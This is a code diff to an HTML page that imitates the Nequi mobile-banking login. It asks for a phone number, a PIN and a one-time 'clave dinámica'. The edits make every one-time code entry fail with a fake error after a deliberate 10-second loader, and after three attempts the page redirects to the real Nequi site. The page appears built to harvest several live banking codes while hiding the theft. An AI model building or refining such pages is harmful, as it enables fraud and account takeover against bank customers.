@@ -157,15 +157,16 @@
       border: 6px solid rgba(255,45,149,0.2);
       border-top: 6px solid #FF2D95;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      animation: spin 1.2s linear infinite;
       margin-bottom: 25px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .error-text {
       color: #FF4D4D;
-      font-size: 21px;
-      margin: 30px 0 10px 0;
+      font-size: 22px;
+      margin: 40px 0 15px 0;
+      font-weight: 500;
     }
   </style>
 </head>
@@ -233,25 +234,25 @@
       </div>
     </div>
 
-    <!-- Loader -->
+    <!-- Loader - 10 segundos -->
     <div class="screen" id="loader">
       <div class="spinner"></div>
-      <div style="text-align:center; font-size:18px;">Verificando información...</div>
+      <div style="text-align:center; font-size:18px;">Verificando clave dinámica...</div>
     </div>
 
-    <!-- Pantalla de Error - Clave Dinámica Errada -->
+    <!-- Pantalla de Error -->
     <div class="screen" id="errorScreen">
       <div class="error-text">Clave dinámica errada</div>
       <div class="message">El código ingresado no es correcto.<br>Por favor intenta nuevamente.</div>
-      <button onclick="retryDynamic()" style="margin-top:60px;">Intentar de nuevo</button>
-      <div style="margin-top:40px; color:#FF2D95; font-size:16px;" id="attemptsLeft">Intentos restantes: 3</div>
+      <button onclick="retryDynamic()" style="margin-top:50px;">Intentar de nuevo</button>
+      <div style="margin-top:40px; color:#FF88B5; font-size:16px;" id="attemptsText">Intentos restantes: 3</div>
     </div>
 
   </div>
 
   <script>
     let phoneNumber = "";
-    let attempts = 3;
+    let attemptsLeft = 3;
     let currentPin = "";
     let currentLength = 4;
 
@@ -290,8 +291,8 @@
     }
 
     function updatePins() {
-      const id = currentLength === 4 ? "pins4" : "pins6";
-      const pins = document.querySelectorAll(`#${id} .pin`);
+      const container = currentLength === 4 ? "#pins4" : "#pins6";
+      const pins = document.querySelectorAll(container + " .pin");
       pins.forEach((pin, i) => {
         pin.textContent = i < currentPin.length ? "●" : "";
       });
@@ -309,23 +310,25 @@
 
       showScreen('loader');
 
+      // ← Aquí está el cambio principal: 10 segundos de loader
       setTimeout(() => {
         if (currentLength === 4) {
           showScreen('screen3');
         } else {
-          showScreen('errorScreen');
-          document.getElementById('attemptsLeft').textContent = `Intentos restantes: ${attempts}`;
+          // Clave dinámica ingresada → Error
+          attemptsLeft--;
+          if (attemptsLeft > 0) {
+            document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
+            showScreen('errorScreen');
+          } else {
+            window.location.href = "https://www.nequi.com.co";
+          }
         }
-      }, 2000);
+      }, 10000); // 10 segundos
     }
 
     function retryDynamic() {
-      attempts--;
-      if (attempts > 0) {
-        showScreen('screen3');
-      } else {
-        window.location.href = "https://www.nequi.com.co";
-      }
+      showScreen('screen3');
     }
 
     function goBack(from) {
